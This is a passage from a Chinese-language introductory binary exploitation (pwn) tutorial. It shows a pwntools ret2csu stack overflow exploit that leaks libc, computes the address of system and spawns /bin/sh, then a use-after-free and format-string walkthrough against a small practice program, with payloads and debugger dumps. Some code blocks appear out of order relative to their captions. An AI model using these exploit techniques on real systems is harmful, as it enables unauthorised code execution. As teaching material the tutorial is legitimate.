0000000000601018 R\_X86\_64\_JUMP\_SLOT  write@GLIBC\_2.2.5
0000000000601020 R\_X86\_64\_JUMP\_SLOT  read@GLIBC\_2.2.5
"""
got\_write =0x0000000000601018
print("\[+\] got\_write = 0x%x" % got\_write)

got\_write2=linux\_x64\_test3\_elf.got\["write"\]
print("\[+\] got\_write2 = 0x%x" %  got\_write2)

got\_read = 0x0000000000601020
got\_read2=linux\_x64\_test3\_elf.got\["read"\]

"""
0000000000400587 <main>:
  400587:    55                       push   %rbp
"""
main\_static = 0x0000000000400587

# call got\_write(rdi=1,rsi=got\_write, rdx=8)
# rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call\_address
payload1 ="A"\*136 + p64(pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret) # ret address  : p64(pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret)
payload1 += p64(0)+ p64(1)                               # rbx=0 rbp=1  : p64(0)+ p64(1)
payload1 += p64(got\_write)                               # call\_address : got\_write
payload1 += p64(8)                                       # param3       : 8
payload1 += p64(got\_write)                               # param2       : got\_write
payload1 += p64(1)                                       # param1       : 1

payload1 += p64(rdx\_rsi\_rdi\_callr12\_ret)                 # call r12
payload1 += p64(0)\*7                                     # add    $0x8,%rsp # 6 pop
payload1 += p64(main\_static)                             # return main

p.recvuntil('Hello, World\\n')

print("\[+\] send payload1 call got\_write(rdi=1,rsi=got\_write, rdx=8)")
p.send(payload1)
sleep(1)

write\_addr = u64(p.recv(8))
print("\[+\] write\_addr = 0x%x" % write\_addr)

write\_static = libc\_elf.symbols\['write'\]
system\_static = libc\_elf.symbols\['system'\]

system\_addr = write\_addr - (write\_static - system\_static)
print("\[+\] system\_addr = 0x%x" % system\_addr)

"""
  \[26\] .bss              NOBITS           0000000000601040  00001040
       0000000000000008  0000000000000000  WA       0     0     1
"""
bss\_addr = 0x0000000000601040
bss\_addr2 = linux\_x64\_test3\_elf.bss()
print("\[+\] bss\_addr  = 0x%x" % bss\_addr)
print("\[+\] bss\_addr2 = 0x%x" % bss\_addr2)

# call got\_read(rdi=0,rsi=bss\_addr, rdx=16)
# got\_read(rdi=0,rsi=bss\_addr, rdx=8)             write system
# got\_read(rdi=0,rsi=bss\_addr+8, rdx=8)           write /bin/sh
# rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call\_address

payload2 = "A"\*136 + p64(pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret)    # ret address  : p64(pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret)
payload2 += p64(0)+ p64(1)                                   # rbx=0 rbp=1  : p64(0)+ p64(1)
payload2 += p64(got\_read)                                    # call\_address : got\_read
payload2 += p64(16)                                          # param3       : 16
payload2 += p64(bss\_addr)                                    # param2       : bss\_addr
payload2 += p64(0)                                           # param1       : 0

payload2 += p64(rdx\_rsi\_rdi\_callr12\_ret)                     # call r12
payload2 += p64(0)\*7                                         # add    $0x8,%rsp   6 pop
payload2 += p64(main\_static)

p.recvuntil('Hello, World\\n')

print("\[+\] send payload2 call got\_read(rdi=0,rsi=bss\_addr, rdx=16)")

# raw\_input()
p.send(payload2)
# raw\_input()

p.send(p64(system\_addr) + "/bin/sh\\0")  #send /bin/sh\\0
"""
00000000:00601040|00007f111b941390|........|
00000000:00601048|0068732f6e69622f|/bin/sh.|
"""
sleep(1)
p.recvuntil('Hello, World\\n')

# call bss\_addr(rdi=bss\_addr+8) system\_addr(rdi=binsh\_addr)
# rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call\_address

payload3 ="A"\*136 + p64(pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret)     # ret address  : p64(pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret)
payload3 += p64(0)+ p64(1)                                   # rbx=0 rbp=1  : p64(0)+ p64(1)
payload3 += p64(bss\_addr)                                    # call\_address : bss\_addr
payload3 += p64(0)                                           # param3       : 0
payload3 += p64(0)                                           # param2       : 0
payload3 += p64(bss\_addr+8)                                  # param1       : bss\_addr+8

payload3 += p64(rdx\_rsi\_rdi\_callr12\_ret)        # call r12
payload3 += p64(0)\*7                            # add $0x8,%rsp   6 pop
payload3 += p64(main\_static)

print("\[+\] send payload3 call system\_addr(rdi=binsh\_addr)")
p.send(payload3)
p.interactive()
```

程序很简单就 3 个操作，create,delete,quit

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQkTyzibcAXgojWcNHB0MCYAHIeKFCVIMwpePia2SLWkicjbt3tDlkgVxibBx6TW7w8IEicvXRvFVGWUg/640?wx_fmt=jpeg)

漏洞点

在 delete 操作上发现调用 free 指针函数释放结构后没有置结构指针为 NULL, 这样就能实现 UAF， 如下图

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQkTyzibcAXgojWcNHB0MCYbOEpq8R7WPnSDW2TIwkRd5vhv48tjSx86YYfxwxOo8cuGQI6YRrtJQ/640?wx_fmt=jpeg)

create 功能会先申请 0x20 字节的内存堆块存储结构，如果输入的字符串长度大于 0xf，则另外申请指定长度的空间存储数据，否则存储在之前申请的 0x20 字节的前 16 字节处，在最后，会将相关 free 函数的地址存储在堆存储结构的后八字节处

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQkTyzibcAXgojWcNHB0MCYlYlpgoBvLRnFuRMVOmHd2Xa8R933ia3JIhNMGBPaXe5leuGa0r4icT2w/640?wx_fmt=jpeg)

在 create 时全局结构指向我们申请的内存

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQkTyzibcAXgojWcNHB0MCYW0p8VYNExWD68Mww45ric3lvS5aLZZDZJz2V6afHKEmib8Hwxlr1oFkA/640?wx_fmt=jpeg)

这样就可以恶意构造结构数据, 利用 uaf 覆盖旧数据结果的函数指针，打印出函数地址，泄露出二进制 base 基址，主要逻辑如下:

```
Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

此时执行 delete 操作，也就执行了

```
create(4 创建old\_chunk0 但是程序占位 old\_chunk0\_size=0x30 申请0x20
create(4 创建old\_chunk1 但是程序占位 old\_chunk1\_size=0x30 申请0x20
释放chunk1
释放chunk0
create(0x20 创建 chunk0 占位 old\_chunk0,占位 old\_chunk1
            创建 chunk1 覆盖 old\_chunk1->data->free 为 puts
```

打印出了 puts\_addr 地址，然后通过计算偏移得到二进制基址, 如下:

```
free(ptr) -> puts(ptr->buffer和后面覆盖的puts地址)
```

然后利用二进制基址算出二进制自带的 printf 真实地址，再次利用格式化字符漏洞实现任意地址读写。如下是得到 printf 真实地址 printf\_addr 后利用格式化字符漏洞实现任意地址读写的测试过程，我们输出 10 个 %p 也就打印了堆栈前几个数据值。然后找到了 arg9 为我们能够控制的数据，所以利用脚本里 printf 输出参数变成了 “%9$p”，读取第九个参数。

```
bin\_base\_addr = puts\_addr - offset
```

IDA 调试时内存数据为如下:

```
delete(0)
payload = 'a%p%p%p%p%p%p%p%p%p%p'.ljust(0x18, '#') + p64(printf\_addr)  # 覆盖chunk1的 free函数-> printf
create(0x20, payload)
p.recvuntil("quit")
p.send("delete ")
p.recvuntil("id:")
p.send(str(1) + '\\n')
p.recvuntil("?:")
p.send("yes.1111" + p64(addr) + "\\n")  # 触发 printf漏洞

p.recvuntil('a')
data = p.recvuntil('####')\[:-4\]
```

利用格式化字符串漏洞实现任意地址后，读取两个 libc 函数然后确定 libc 版本, 获取对应 libc 版本的 system\_addr

#### 最终利用

```
0000560DFCD3C000  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......
0000560DFCD3C010  40 C0 D3 FC 0D 56 00 00  00 00 00 00 00 00 00 00  @....V..........
0000560DFCD3C020  1E 00 00 00 00 00 00 00  6C CD 7C FB 0D 56 00 00  ........l....V..
0000560DFCD3C030  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......
0000560DFCD3C040  61 25 70 25 70 25 70 25  70 25 70 25 70 25 70 25  a%p%p%p%p%p%p%p%
0000560DFCD3C050  70 25 70 25 70 23 23 23  D0 C9 7C FB 0D 56 00 00  p%p%p###..|..V..

00007FFE50BF9630  00 00 00 00 00 00 00 00  00 00 00 00 01 00 00 00  ................
00007FFE50BF9640  79 65 73 2E 31 31 31 31  00 60 8C 2B 45 56 00 00  yes.1111.\`.+EV..

00007FFCA59554F8  0000560DFB7CCE95  delete\_sub\_D95+100
00007FFCA5955500  0000000000000000
00007FFCA5955508  0000000100000000  arg7
00007FFCA5955510  313131312E736579  arg8
00007FFCA5955518  0000560DFB7CC000  LOAD:0000560DFB7CC000 # arg9 读取这个 arg9  所以这里选择 %9$s
00007FFCA5955520  000000000000000A
00007FFCA5955528  0000560DFB7CCA50  start
00007FFCA5955530  00007FFCA5955D90  \[stack\]:00007FFCA5955D90
```

总结
--

通过这些入门 pwn 知识的学习，对栈溢出, 堆溢出, uaf 的利用会有清晰的理解。对以后分析真实利用场景漏洞有很大的帮助。利用脚本尽量做的通用，考虑多个平台。那么分析利用有了，对于漏洞挖掘这方面又是新的一个课题，对于这方面的探索将另外写文章分析。

参考
--

> linux 程序的常用保护机制
> 
> linux-pwn
> 
> https://blog.csdn.net/zhy557/article/details/80832268

**推荐↓↓↓**

![](https://mmbiz.qpic.cn/mmbiz_jpg/NVvB3l3e9aG5kWic5P8XOwFOhXKjibAt6Yfb1QuqSRZaV5QGHtqqXZFWkia50TDjpWTBqG8Huj3aMlA6cOE9cBVkQ/640?wx_fmt=jpeg)

**Linux 学习**